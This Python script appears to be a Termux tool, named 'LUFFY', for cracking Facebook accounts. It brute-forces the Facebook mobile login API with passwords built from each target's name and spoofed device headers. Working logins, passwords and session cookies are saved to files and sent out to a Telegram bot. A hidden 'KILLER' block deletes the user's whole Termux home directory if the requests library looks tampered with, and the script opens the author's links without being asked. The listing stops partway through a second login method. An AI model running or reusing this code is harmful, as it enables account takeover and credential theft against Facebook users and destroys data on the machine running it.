import os,requests,json,time,re,random,sys,uuid,string,subprocess,zlib,platform
import marshal
import os,base64
import webbrowser
webbrowser.open('https://www.facebook.com/profile.php?id=100003176234638&mibextid=JRoKGi')
from os import system as clr
print('\033[1;37m[\033[1;31m~\033[1;37m] \033[1;32minstall modules...\n It will take some seconds...')
os.system('xdg-open https://www.facebook.com/profile.php?id=100003176234638&mibextid=JRoKGi')
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess,platform
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python LUFFY.py')
except:pass
try:
    import httplib2
except ImportError:
    print("httplib2 module not found. Installing...")
    subprocess.check_call(['pip', 'install', 'httplib2'])
    import httplib2

os.system("pip uninstall urllib3 requests chardet idna certifi -y");os.system("pip install urllib3 requests chardet idna certifi")

#_________[ PROXY SERVER ]______>>
os.system('rm -rf .prox.txt')  
try:
    prox= requests.get('https://raw.githubusercontent.com/mafiat2/M01/main/.prox.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.prox.txt','r').read().splitlines()
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550    5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ugen=[]
####_____VERSION-UA-SETUP_____#####

os.system('clear')
print('\033[1;37m[\033[1;31m~\033[1;37m] \033[1;32mPLEASE WAIT CHECKING UPDATE...')
os.system("espeak -a 300 \"PLEASE,WAIT,CHECKING,UPDATE,\"")
print('\033[1;37m[\033[1;31m~\033[1;37m] \033[1;32mWELLCOM TO MAFIA XYLON TOOL ...')
os.system("espeak -a 300 \"WELLCOM, TO, MAFIA,  XYLON,  TOOL,\"")
print('\033[1;37m[\033[1;31m~\033[1;37m] \033[1;32mTO UPDATE VERSION 5.13 ..') 
os.system("espeak -a 300 \"TO,  UPDATE,  VERSION,  5.13 \"")

####### KILLER #######
 
from requests import api
x = open(api.__file__,'r').read()
if "print" in x:	
    clr()
    shutil.rmtree("/data/data/com.termux/files/home")
elif "sys.stdout.write" in x:	
    clr()   
else:
    pass
from requests import sessions
 
x = open(sessions.__file__,'r').read()
if "print" in x:	
    clr()
    shutil.rmtree("/data/data/com.termux/files/home")
elif "sys.stdout.write" in x:	
    clr()
    shutil.rmtree("/data/data/com.termux/files/home")
else:
    pass
from requests import models
x = open(models.__file__,'r').read()
if "print" in x:	
    clr()
    shutil.rmtree("/data/data/com.termux/files/home")
 
elif "sys.stdout.write" in x:	
    clr()
    shutil.rmtree("/data/data/com.termux/files/home")
else:
    pass           
def getKey():

    uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
    id = "".join(uuidd).replace("_","").replace("360","JXB").replace("u","9").replace("a","A")
    plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
    xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
    bxd = "MAFIA-"
    bumper = bxd+id+xp
    return bumper
android_versi = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
model_device = subprocess.check_output("getprop ro.product.model",shell=True).decode("utf-8").replace("\n","")
build_device = subprocess.check_output("getprop ro.build.id",shell=True).decode("utf-8").replace("\n","")
versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
large_device = "{density=2.25,height="+subprocess.check_output("getprop ro.hwui.text_large_cache_height",shell=True).decode("utf-8").replace("\n","")+",width="+subprocess.check_output("getprop ro.hwui.text_large_cache_width",shell=True).decode("utf-8").replace("\n","")+"}"
merk_device = subprocess.check_output("getprop ro.product.manufacturer",shell=True).decode("utf-8").replace("\n","")
brand_device = subprocess.check_output("getprop ro.product.brand",shell=True).decode("utf-8").replace("\n","")
cpu_device = subprocess.check_output("getprop ro.product.cpu.abilist",shell=True).decode("utf-8").replace(",",":").replace("\n","")
versi_app = str(random.randint(111111111,999999999))
language = "en_US"
try:
    simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
except:
    simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","") 

#<<_________[ date  ]_________>>#
def joined(ids):
    if len(ids)==15:
        if ids[:10] in ['1000000000']       :creation = '\33[1;32m| \33[1;32m2009' 
        elif ids[:9] in ['100000000']       :creation = '\33[1;32m| \33[1;32m2009' 
        elif ids[:8] in ['10000000']        :creation = '\33[1;32m| \33[1;32m2009' 
        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:creation = '\33[1;32m| \33[1;33m2009' 
        elif ids[:7] in ['1000006','1000007','1000008','1000009']:creation = '\33[1;32m| \33[1;32m2010' 
        elif ids[:6] in ['100001']          :creation = '\33[1;32m| \33[1;32m2010\33[1;32m/\33[1;32m2011'
        elif ids[:6] in ['100002','100003'] :creation = '\33[1;32m| \33[1;32m2011\33[1;32m/\33[1;32m2012'
        elif ids[:6] in ['100004']          :creation = '\33[1;32m| \33[1;32m2012\33[1;32m/\33[1;32m2013'
        elif ids[:6] in ['100005','100006'] :creation = '\33[1;32m| \33[1;32m2013\33[1;32m/\33[1;32m2014'
        elif ids[:6] in ['100007','100008'] :creation = '\33[1;32m| \33[1;3wm2014\33[1;32m/\33[1;32m2015'
        elif ids[:6] in ['100009']          :creation = '\33[1;32m| \33[1;32m2015' 
        elif ids[:5] in ['10001']           :creation = '\33[1;32m| \33[1;32m2015\33[1;32m/\33[1;32m2016'
        elif ids[:5] in ['10002']           :creation = '\33[1;32m| \33[1;32m2016\33[1;32m/\33[1;32m2017'
        elif ids[:5] in ['10003']           :creation = '\33[1;32m| \33[1;32m2018\33[1;32m/\33[1;32m2019'
        elif ids[:5] in ['10004']           :creation = '\33[1;32m| \33[1;32m2019\33[1;32m/\33[1;32m2020'
        elif ids[:5] in ['10005']           :creation = '\33[1;32m| \33[1;32m2020' 
        elif ids[:5] in ['10006','10007','']:creation = '\33[1;32m| \33[1;32m2021' 
        elif ids[:5] in ['10008']           :creation = '\33[1;32m| \33[1;32m2022' 
        elif ids[:5] in ['10009']           :creation = '\32[1;32m| \32[1;33m2022\32[1;32m/\32[1;32m2023'
        elif ids[:4] in ['6155']           :creation = '\32[1;32m| \32[1;32m2023' 
        else:creation=''
    elif len(ids) in [9,10]:
        creation = '\33[1;32m| \33[1;32m2008/2009'
    elif len(ids)==8:
        creation = '\33[1;32m| \33[1;32m2007/2008'
    elif len(ids)==7:
        creation = '\33[1;32m| \33[1;32m2006/2007'
    else:creation=''
    return creation


#<<_________[ BOT  OK  ]_________>>#

def Elite(id,ps,coki):
    try:
        import requests
        token = "lol"#Add yout token 
        chatid = "lol"#Add your Chat Id
        ok_id =str(id+"|"+ps+"|"+coki)
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        params = {"chat_id": chatid, "text": ok_id}
        requests.get(url, params=params)
    except:
        pass
        
#<<_________[ APK  ]_________>>#
def cek_apk(coki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+coki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r      %s%s %s%s"%(N,i+1,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r      %s! cookie invalid"%(N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+coki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r      %s%s %s%s"%(K,i+1,N,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r      %s• cookie invalid"%(M))

#»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» 

def p(x):
	print(x)
#<<_________[ LOGO ]_________>>#
os.system(f'xdg-open https://t.me/Abdullha_404')
sys.stdout.write('\x1b]2; <[LUFFY]>\x07')
logo=(f"""
d      d       b d sss  d sss  Ss   sS 
S      S       S S      S        S S   
S      S       S S      S         S    
S      S       S S sSSs S sSSs    S    
S      S       S S      S         S    
S       S     S  S      S         S    
P sSSs   "sss"   P      P         P    
\033[1;32m(KHAlïl)
\033[1;34m═══════════════════════════════════════════════
\033[1;37m❲\033[1;37m=\033[1;37m❳ \033[1;32mFACEBOK \033[1;37m: KHAlïl 
\033[1;37m❲\033[1;37m=\033[1;37m❳ \033[1;32mGITHUB  \033[1;37m: LUFFY
\033[1;37m❲\033[1;37m=\033[1;37m❳ \033[1;32mSERVICE \033[1;37m: FREE
\033[1;37m❲\033[1;37m=\033[1;37m❳ \033[1;32mVERSION \033[1;37m: 4.0
\033[1;34m══════════════════════════════════════""")
def linex():
    print('\033[1;34m══════════════════════════════════════')
def clear():
        os.system('clear')
        print(logo)
loop=0
lim=0
tp=0
oks=[]
cps=[]
pcp=[]
id=[]

os.system("clear")
#<<_________[ main menu ]_________>>#
def menu():
                        clear()	
                        print('\033[1;37m❲\033[1;37m1\033[1;37m❳ \033[1;32mCRACK FILE ')
                        print('\033[1;37m❲\033[1;37m2\033[1;37m❳ \033[1;32mCREAT FILE FB ')
                        print('\033[1;37m❲\033[1;37m3\033[1;37m❳ \033[1;32mUNBLOCk NETWORk IP')
                        print('\033[1;37m❲\033[1;37m0\033[1;37m❳ \033[1;32mEXIT ')
                        linex()
                        xd=input('\033[1;37m❲\033[1;37m؟\033[1;37m❳ \033[1;32mChose : ')
                        if xd in ['1','01']:
                                clear()
                                print('\033[1;37m❲\033[1;37m=\033[1;37m❳ \033[1;32mPut file example:  /sdcard/File.txt ...')
                                linex()
                                file = input('\033[1;37m❲\033[1;37m=\033[1;37m❳ \033[1;32mPut file path\033[1;37m: ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(' File location not found ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print('\033[1;37m❲\033[1;37m=\033[1;37m❳ \033[1;32mAll method working try 1 by 3 ')
                                linex()
                                print('\033[1;37m[\033[1;31m1\033[1;37m] \033[1;37mMethod \033[1;37m[\033[1;31mMIX\033[1;37m]\033[1;37m')
                                print('\033[1;37m[\033[1;31m2\033[1;37m] \033[1;37mMethod \033[1;37m[\033[1;31mMIX\033[1;37m]\033[1;37m ')
                                print('\033[1;37m[\033[1;31m3\033[1;37m] \033[1;37mMethod \033[1;37m[\033[1;31mNEW\033[1;37m]\033[1;37m ')
                                print('\033[1;37m[\033[1;31m4\033[1;37m] \033[1;37mMethod \033[1;37m[\033[1;31mMIX\033[1;37m]\033[1;37m')
                                #print('\033[1;37m[\033[1;31m5\033[1;37m] \033[1;37mMethod \033[1;37m[\033[1;31mMIX\033[1;37m]\033[1;37m ')
                                #print('\033[1;37m[\033[1;31m6\033[1;37m] \033[1;37mMethod \033[1;37m[\033[1;31mMIX\033[1;37m]\033[1;37m ')
                                linex()
                                mthd=input('\033[1;37m❲\033[1;37m؟\033[1;37m❳ \033[1;32mChoose: ')
                                linex()
                                plist = []
                                print("\033[1;37m❲\033[1;37m1\033[1;37m❳ \033[1;32mAuto Password  ")                                
                                print("\033[1;37m❲\033[1;37m2\033[1;37m❳ \033[1;32mManual Password ") 
                                linex()
                                psx=input('\033[1;37m❲\033[1;37m?\033[1;37m❳ \033[1;32mChoose: ')
                                if psx in ['1','01']:
                                        plist.append('first first')
                                        plist.append('first last')
                                        plist.append('last first')
                                        plist.append('last last')
                                        plist.append('firstfirst')     
                                        plist.append('firstlast')
                                        plist.append('lastfirst')
                                        plist.append('lastlast')
                                        plist.append("firstlast123")
                                        plist.append("firstlast1234")
                                        plist.append('firstlast12345')
                                        plist.append('first 123')
                                        plist.append('first 1234')
                                        plist.append('first 12345')
                                        plist.append('first12')
                                        plist.append('first123')
                                        plist.append('first1234')
                                        plist.append('first12345')
                                        plist.append('first123456')
                                        plist.append('first123456789')
                                else:
                                        try:
                                                linex()
                                                ps_limit = int(input('\033[1;37m❲\033[1;37m=\033[1;37m❳ \033[1;32mHow many passwords do you want to add ? '))
                                        except:
                                                ps_limit =1
                                        linex()
                                        print('\033[1;37m❲\033[1;37m=\033[1;37m❳ \033[1;32mexp: first last,firstlast,first123')
                                        linex()
                                        for i in range(ps_limit):
                                                plist.append(input(f'\033[1;37m❲\033[1;37m=\033[1;37m❳ \033[1;32mPassword {i+1}: \033[1;37m'))
                                      
                                linex()
                                print('\033[1;37m❲\033[1;37m=\033[1;37m❳ \033[1;32mDo you went show cp account? \033[1;37m[\033[1;31mY/N\033[1;37m] \033[1;37m: ')
                                linex()
                                cx=input('\033[1;37m❲\033[1;37m?\033[1;37m❳ \033[1;32mChoose: ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                    pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print('\033[1;37m❲\033[1;37m=\033[1;37m❳ \033[1;32mTOTAL FILE ACCOUNTS : \033[1;31m'+total_ids+f' ')
                                        print('\033[1;37m❲\033[1;37m=\033[1;37m❳ \033[1;32mPROCESS START PLEASE WAIT.....')
                                        print("\033[1;37m❲\033[1;37m=\033[1;37m❳ \033[1;32mIF NO RESULT \033[1;37m[\033[1;32mON/\033[1;31mOFF\033[1;37m] \033[1;32mAIRPLAN MODE ")
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(M1,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(M2,ids,names,passlist)
                                                elif mthd in ['3','03']:
                                                        crack_submit.submit(M3,ids,names,passlist)
                                                else:
                                                        crack_submit.submit(M4,ids,names,passlist)
                                                         
                                print('\033[1;37m')
                                linex()
                                print('\033[1;37m❲\033[1;37m=\033[1;37m❳ \033[1;32mThe process has completed')
                                print('\033[1;37m❲\033[1;37m=\033[1;37m❳ \033[1;32mTotal OK/CP: \033[1;32m'+str(len(oks))+'/'+str(len(cps)))
                                linex()
                                input('\033[1;37m❲\033[1;37m=\033[1;37m❳ \033[1;32mPress enter to back ')
                                os.system('python LUFFY.py')
                        elif xd in ['2','02']:                               
                                create()
                        elif xd in ['3','03']:
                                createip()
                                exit()
                                x=input(' Choose: ')
                                if x in ['1','01']:
                                        pak()
                                elif x in ['2','02']:
                                        bd()
                                elif x in ['3','03']:
                                        npxind()                              
                                else:
                                        menu()
                        elif xd in ['4','04']:
                                os.system('xdg-open https://www.facebook.com/profile.php?id=100003176234638&mibextid=JRoKGi')
                                menu()
                        elif xd in ['5','05']:
                                os.system('xdg-open https://www.facebook.com/profile.php?id=100003176234638&mibextid=JRoKGi')
                                menu()
                        elif xd in ['6','06']:
                                os.system('xdg-open https://www.facebook.com/profile.php?id=100003176234638&mibextid=JRoKGi')
                                menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use ♥ ')
                        else:
                                exit(' Option not found in menu...')

#<<_________[ METHOD 1 ]_________>>#
def M1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m<❲LUFFY❳>♡<[%s| \033[1;32mOK\033[1;37m|\033[1;34mCP \033[1;32m%s\033[1;37m|\033[1;34m%s\033[1;37m]> '%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
                                android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                                facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
                                fbbv = str(random.randint(10000000, 99999999))
                                fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                                density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                                width = random.randint(720, 1440)
                                height = random.randint(1080, 2560)
                                fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                                fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/69.0.0.26.76;FBBV/25862460;FBDM/{density=1.5,width=540,height=888};FBLC/es_LA;FBCR/AT&amp-T;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1021;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/169.0.0.46.94;FBBV/104748689;FBDM/{density=2.625,width=1080,height=1920};FBLC/en_US;FBRV/104800574;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-N920A;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "family_device_id": str(uuid.uuid4()),
                                        "advertiser_id": str(uuid.uuid4()),
                                        "locale":"fr_DZ","client_country_code":"DZ",
                                        "device_id": str(uuid.uuid4()),
                                        "method": "auth.login",
                                        "api_key": "882a8490361da98702bf97a021ddc14d",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'Host': 'graph.facebook.com',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'X-FB-Connection-Type': 'MOBILE.LTE',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-device-group': '5120',
                                        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'X-FB-Client-IP': 'True',
                                        'X-FB-Server-Cluster': 'True',
                                        'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                                        'x-fb-friendly-name':'ViewerReactionsMutation',
                                        'X-FB-Request-Analytics-Tags': 'graphservice',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                             
                                        print('\r\r\033[1;32m<❲LUFFY-OK❳> '+ids+' | '+pas+'\033[1;97m')
                                                         
                                        #------[OK IDS]------#
                                        #print("\033[1;33m <[BISCUT-🍪]> :\033[1;33m "+cookie)                                                   
                                        open('/sdcard/LUFFY_m1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/LUFFY_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        oks.append(ids)
                                        Elite(ids,pas,ckkk)
                                        break                          
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;34m<❲LUFFY❳-CP> '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/LUFFY-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/LUFFY-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass

#<<_________[ METHOD 2 ]_________>>#
def M2(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m<❲LUFFY❳-M2>×<[%s| \033[1;32mOK\033[1;37m|\033[1;34mCP \033[1;32m%s\033[1;37m|\033[1;34m%s\033[1;37m]> '%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
                                android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                                facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
                                fbbv = str(random.randint(10000000, 99999999))
                                fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                                density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                                width = random.randint(720, 1440)
                                height = random.randint(1080, 2560)
                                fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                                fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
